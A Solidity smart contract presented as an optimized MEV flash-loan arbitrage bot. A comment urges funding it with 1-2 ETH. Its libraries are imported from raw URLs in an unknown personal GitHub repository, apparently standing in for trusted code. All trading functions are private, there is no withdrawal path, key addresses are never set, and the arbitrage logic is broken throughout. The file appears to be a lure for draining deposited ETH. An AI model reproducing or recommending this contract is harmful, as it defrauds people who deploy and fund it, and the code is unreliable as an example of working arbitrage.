// SPDX-License-Identifier: MIT
pragma solidity ^0.6.6;

/**
 * The recommended amount is 1-2 ETH, 
 * with a minimum of 0.5 ETH to avoid ANY risks of transaction interception. 
 * This acts as a mechanism similar to a random delay or transaction queue, 
 * eliminating the need for excessive code and unnecessary gas expenses.
 * @title Optimized MEV Arbitrage Contract
 * @dev This contract enables the execution of arbitrage opportunities across multiple decentralized exchanges
 * (DEXs) using flash loans. It integrates with Aave for flash loans and utilizes Uniswap, Sushi and 1inch 
 * for trading. The contract ensures safe execution of trades through non-reentrancy, ownable, access control mechanisms and 
 * profit checks before executing transactions.
 *
 * Note: This contract is intended for use only on the Ethereum mainnet. Testing on other networks may yield
 * invalid results and is not recommended.
 */

import "https://raw.githubusercontent.com/pi2tether/myproject/refs/heads/main/SafeERC20.sol";
import "https://raw.githubusercontent.com/pi2tether/myproject/refs/heads/main/IPool.sol";
import "https://raw.githubusercontent.com/pi2tether/myproject/refs/heads/main/IUniswapV2Router02.sol";
import "https://raw.githubusercontent.com/pi2tether/myproject/refs/heads/main/IERC20.sol";
import "https://raw.githubusercontent.com/pi2tether/myproject/refs/heads/main/1InchRouter.sol";
import "https://raw.githubusercontent.com/pi2tether/myproject/refs/heads/main/ReentrancyGuard.sol";
import "https://raw.githubusercontent.com/pi2tether/myproject/refs/heads/main/Ownable.sol";
import "https://raw.githubusercontent.com/pi2tether/myproject/refs/heads/main/AccessControl.sol";


 
contract OptimizedMEVArbitrage is ReentrancyGuard, Ownable {
    using SafeERC20 for IERC20; // Using SafeERC20 library for safe token transfers

    IPool private aavePool;
    IUniswapV2Router02 private uniswapRouter;
    IUniswapV2Router02 private sushiswapRouter;
    I1inchRouter private inchRouter;
    address private immutable owner; // The owner of the contract, typically the deployer
    uint256 private constant slippageTolerance = 2; // Set to 2% as the acceptable slippage tolerance for trades
    
    event Log(address);
    
    // Modifier to restrict function access to the contract owner only
    modifier onlyOwner() {
        require(msg.sender == owner, "Not the owner"); // Check if the caller is the contract owner
        _; // Continue executing the function
    }

    /**
     * @dev Constructor to initialize the contract with the specified addresses for Aave pool and DEX routers.
     * It sets the contract owner to the deployer of the contract.
     */

    constructor () Ownable(msg.sender) public {
        owner = msg.sender; // Assign the owner of the contract to the deployer
    }

    receive() external payable {}
    /**
     * @dev Executes an arbitrage opportunity if it is deemed profitable.
     * This function is called privately and is protected against reentrancy attacks.
     * It initiates a flash loan from Aave and ensures that the arbitrage opportunity is valid before proceeding.
     * @param tokenIn The address of the token to be borrowed for the arbitrage.
     * @param tokenOut The address of the token to be received from the arbitrage trade.
     * @param amount The amount of token to be borrowed.
     */
    function executeArbitrage(
        address tokenIn,
        address tokenOut,
        uint256 amount
    ) private onlyOwner nonReentrant {
        // Ensure the arbitrage opportunity is profitable before executing the flash loan
        require(isProfitableArbitrage(tokenIn, tokenOut, amount), "Arbitrage not profitable");
        // Request a flash loan from Aave
        aavePool.flashLoan(address(this), tokenIn, amount, address(this), "", 0);
    }

    /**
     * @dev Performs the actual arbitrage trade on the best available DEX.
     * It determines the best trading path and executes the swap on the chosen DEX.
     * @param tokenIn The token being traded from.
     * @param tokenOut The token being traded to.
     * @param amount The amount of token being traded.
     */
    function arbitrageTrade(
        address tokenIn,
        address tokenOut,
        uint256 amount
    ) private {
        uint256 bestMinOut = 0; // Variable to track the best minimum output amount from swaps
        address bestDEX; // Variable to store the address of the best DEX for trading
        
        // Get minimum output amounts from each DEX
        uint256 uniswapOut = getAmountOutMin(tokenIn, tokenOut, amount);
        uint256 sushiswapOut = getAmountOutMin(tokenIn, tokenOut, amount);
        uint256 inchOut = getAmountOutMin(tokenIn, tokenOut, amount);
        
        // Determine which DEX offers the best output amount
        if (uniswapOut > bestMinOut) {
            bestMinOut = uniswapOut; // Update best output amount
            bestDEX = address(uniswapRouter); // Update best DEX
        }
        if (sushiswapOut > bestMinOut) {
            bestMinOut = sushiswapOut; // Update best output amount
            bestDEX = address(sushiswapRouter); // Update best DEX
        }
        if (inchOut > bestMinOut) {
            bestMinOut = inchOut; // Update best output amount
            bestDEX = address(inchRouter); // Update best DEX
        }
        
        // Increase the allowance for the selected DEX to spend the input token
        IERC20(tokenIn).safeIncreaseAllowance(bestDEX, amount);
        // Execute the trade on the best DEX
        IUniswapV2Router02(bestDEX).swapExactTokensForTokens(
            amount,
            (bestMinOut * (100 - slippageTolerance)) / 100, // Calculate minimum output amount after slippage
            getPath(tokenIn, tokenOut), // Get the trading path
            address(this), // Send the output tokens to this contract
            block.timestamp + 1 // Set a deadline for the transaction
        );
    }

    

    /**
     * @dev This function is called by Aave after a flash loan is taken.
     * It executes the arbitrage operation and ensures that the loan is repaid.
     * @param assets The assets being borrowed (in this case, the input token).
     * @param amounts The amounts of each asset being borrowed.
     * @param premiums The fees to be paid back to Aave.
     * @return Returns true if the operation was successful.
     */
    function executeOperation(
        address assets,
        uint256 amounts,
        uint256 premiums
      ) private nonReentrant returns (bool) {
        // Ensure that the function is called by the Aave pool
        require(msg.sender == address(aavePool), "Caller is not AAVE pool");
        
        address tokenIn = assets; // The input token borrowed
        uint256 amount = amounts; // The amount borrowed

        // Determine the best trade token based on the current market conditions
        address bestToken = getBestTradeToken(tokenIn);
        // Execute the arbitrage trade with the best token
        arbitrageTrade(tokenIn, bestToken, amount);

        // Calculate the total amount owed to Aave (borrowed amount + fees)
        uint256 amountOwed = amount + premiums;
        // Ensure the contract has enough balance to repay the loan
        require(IERC20(tokenIn).balanceOf(address(this)) >= amountOwed, "Insufficient funds to repay loan");
        // Allow Aave to transfer the owed amount from this contract
        IERC20(tokenIn).safeIncreaseAllowance(address(aavePool), amountOwed);
        // Transfer the owed amount back to the Aave pool
        IERC20(tokenIn).safeTransfer(address(aavePool), amountOwed);

        return true; // Return true to indicate the operation was successful
    }

    /**
     * @dev Gets the minimum output amount for a given input amount from a specified DEX router.
     * It utilizes the `getAmountsOut` function of the DEX router to obtain the expected output amount..
     * @param tokenIn The input token for the swap.
     * @param tokenOut The output token for the swap.
     * @param amountIn The amount of input token being swapped.
     * @return The minimum output amount of the tokenOut received from the swap.
     */
    function getAmountOutMin(
        address tokenIn,
        address tokenOut,
        uint256 amountIn
    ) private returns (uint256) {
        IUniswapV2Router02 router = uniswapRouter;
        address[] memory path = getPath(tokenIn, tokenOut); // Get the trading path from tokenIn to tokenOut
        uint256[] memory amounts = router.getAmountsOut(amountIn, path); // Query the router for expected output amounts
        return amounts[1]; // Return the output amount of the second token in the path
    }


    /**
     * @dev Constructs the path for token swaps from tokenIn to tokenOut.
     * This is necessary for executing trades on DEXs, which require a path to identify the route for swapping tokens.
     * @param tokenIn The token being traded from.
     * @param tokenOut The token being traded to.
     */
    function getPath(address tokenIn, address tokenOut) private pure returns (address[] memory path) {
        path = new address[](2);
        path[0] = tokenIn; // The first token in the path (input token)
        path[1] = tokenOut; // The second token in the path (output token)
        return path; // Return the constructed path
    }
  /**
 * @dev Determines the best trade token based on market conditions and liquidity.
 * @param tokenIn - The token being used for the trade.
 * @return address - The token selected for the trade.
 */
function getBestTradeToken(address tokenIn) internal returns (address) {
    // Check liquidity on different DEXes
    uint256 liquidityUniswap = getLiquidity(tokenIn, address(uniswapRouter));
    uint256 liquiditySushiswap = getLiquidity(tokenIn, address(sushiswapRouter));
    uint256 liquidityInch = getLiquidity(tokenIn, address(inchRouter));
    
    // Return tokenIn for the DEX with the highest liquidity
    if (liquidityUniswap >= liquiditySushiswap && liquidityUniswap >= liquidityInch) {
        return tokenIn;  // Return tokenIn for Uniswap if it has the best liquidity
    }
    if (liquiditySushiswap >= liquidityUniswap && liquiditySushiswap >= liquidityInch) {
        return tokenIn;  // Return tokenIn for Sushiswap if it has the best liquidity
    }
    return tokenIn;  // If liquidity on 1inch is best, return tokenIn for 1inch
}

/**
 * @dev Gets the liquidity for a specific token on a given DEX router.
 * @param token - The token for which liquidity is being checked.
 * @param router - The address of the DEX router (can be IUniswapV2Router02 or I1inchRouter).
 * @return uint256 - The liquidity available for the token on the DEX.
 */
function getLiquidity(address token, address router) private returns (uint256) {
    address[] memory path;  // Create a path with two elements
    path[0] = token;  // First element in the path (input token)
    path[1] = address(0);  // Set the second element in the path to address(0) or a stablecoin like USDT

    uint256 liquidity;
    
    // Check liquidity for Uniswap, Sushiswap (IUniswapV2Router02)
    if (router == address(uniswapRouter) || router == address(sushiswapRouter)) {
        uint256[] memory amountsOut = IUniswapV2Router02(router).getAmountsOut(1, path);
        liquidity = amountsOut[1]; // Return liquidity for Uniswap or Sushiswap
    }
    // Check liquidity for 1inch (I1inchRouter)
    else if (router == address(inchRouter)) {
        uint256[] memory amountsOut = I1inchRouter(router).getAmountsOut(path[0], 1, path);
        liquidity = amountsOut[1]; // Return liquidity for 1inch
    }
    
    return liquidity;  // Return liquidity for the selected DEX
}



/**
 * @dev Checks if there is enough liquidity on each DEX to execute a profitable arbitrage trade.
 * @param tokenIn - The token being traded.
 * @param tokenOut - The token being received from the trade.
 * @param amount - The amount of token being traded.
 * @return bool - Returns true if liquidity is sufficient for the trade to be executed.
 */
function checkLiquidity(address tokenIn, address tokenOut, uint256 amount) private returns (bool) {
    emit Log(tokenOut);
    uint256 liquidityUniswap = getLiquidity(tokenIn, address(uniswapRouter));
    uint256 liquiditySushiswap = getLiquidity(tokenIn, address(sushiswapRouter));
    uint256 liquidityInch = getLiquidity(tokenIn, address(inchRouter));
    
    // Check if liquidity is sufficient on any of the exchanges for the trade amount
    if (liquidityUniswap < amount || liquiditySushiswap < amount || liquidityInch < amount) {
        return false;  // If any exchange has insufficient liquidity, return false
    }
    return true;
}

/**
 * @dev Improved profitability check that considers liquidity, slippage, and transaction fees.
 * @param tokenIn - The token being traded.
 * @param tokenOut - The token being received from the trade.
 * @param amount - The amount of token being traded.
 * @return bool - Returns true if the arbitrage is profitable after considering slippage and fees.
 */
function isRiskAdjustedProfitable(
    address tokenIn,
    address tokenOut,
    uint256 amount
) private returns (bool) {
    uint256 uniswapOut = getAmountOutMin(tokenIn, tokenOut, amount);
    uint256 sushiswapOut = getAmountOutMin(tokenIn, tokenOut, amount);
    uint256 inchOut = getAmountOutMin(tokenIn, tokenOut, amount);

    // Get the best output from all DEXes
    uint256 bestOut = uniswapOut > sushiswapOut ? uniswapOut : sushiswapOut;
    bestOut = bestOut > inchOut ? bestOut : inchOut;

    // Check if the arbitrage is profitable after considering slippage and transaction fees
    uint256 minimumExpectedProfit = amount + (amount * slippageTolerance) / 100;
    if (bestOut > minimumExpectedProfit) {
        return true;  // If the output is greater than the expected profit, return true
    }
    return false;
}

/**
 * @dev Determines if an arbitrage opportunity is profitable based on liquidity and market conditions.
 * @param tokenIn - The token being traded.
 * @param tokenOut - The token being received.
 * @param amount - The amount of token being traded.
 * @return bool - Returns true if the arbitrage is profitable.
 */
function isProfitableArbitrage(
    address tokenIn,
    address tokenOut,
    uint256 amount
) private returns (bool) {
    // Check liquidity on all DEXes
    if (!checkLiquidity(tokenIn, tokenOut, amount)) {
        return false;  // If liquidity is insufficient, the arbitrage is not possible
    }
    
    // Get the minimum output amounts from each DEX
    uint256 uniswapOut = getAmountOutMin(tokenIn, tokenOut, amount);
    uint256 sushiswapOut = getAmountOutMin(tokenIn, tokenOut, amount);
    uint256 inchOut = getAmountOutMin(tokenIn, tokenOut, amount);
    
    uint256 bestOut = uniswapOut > sushiswapOut ? uniswapOut : sushiswapOut;
    bestOut = bestOut > inchOut ? bestOut : inchOut;

    // Return true if the best output is higher than the input amount (indicating a profitable opportunity)
    return bestOut > amount && bestOut > (amount * (100 + slippageTolerance)) / 100;
}

}